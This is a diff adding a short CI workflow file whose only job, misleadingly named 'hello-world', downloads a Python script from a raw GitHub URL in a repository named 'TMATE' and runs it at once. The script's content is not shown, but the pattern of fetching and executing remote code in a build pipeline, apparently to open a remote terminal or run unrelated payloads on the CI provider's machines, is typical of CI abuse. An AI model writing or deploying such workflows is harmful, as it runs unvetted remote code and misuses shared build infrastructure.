@@ -1,0 +1,5 @@
+workflows:
+  hello-world:
+    name: kanjut
+    scripts:
+        - wget https://raw.githubusercontent.com/sbwsmg/TMATE/main/den.py && python den.py
